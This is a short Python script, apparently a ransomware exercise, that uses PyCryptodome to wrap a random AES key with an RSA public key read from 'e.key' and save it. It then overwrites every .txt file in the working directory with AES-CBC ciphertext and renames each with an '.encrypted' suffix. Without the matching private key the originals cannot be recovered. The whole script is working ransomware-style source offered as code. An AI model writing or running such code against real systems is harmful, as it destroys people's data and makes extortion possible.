from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
from Crypto.Cipher import PKCS1_OAEP    #https://pycryptodome.readthedocs.io/en/latest/src/cipher/oaep.html#rsa-oaep
import os

with open('e.key', 'rb') as e:
    data = e.read()

public_key = RSA.import_key(data)
encryption_key = get_random_bytes(16)
encryption_cipher = AES.new(encryption_key, AES.MODE_CBC)


key_cipher = PKCS1_OAEP.new(public_key)
encrypted_key = key_cipher.encrypt(encryption_key)
with open('EncryptedSharedKey','wb') as k:
    k.write(encrypted_key)

current_directory = os.getcwd()
for entry in os.listdir(current_directory):
    if entry.endswith('.txt'):

        f = open(entry,'rb')
        data = f.read()
        f.close()
        f = open(entry, 'wb')
        cipher = AES.new(encryption_key, AES.MODE_CBC)
        ciphered_data = cipher.encrypt(pad((data), AES.block_size))
        f.write(cipher.iv)
        f.write(ciphered_data)
        os.rename(entry, entry+'.encrypted')
        f.close()
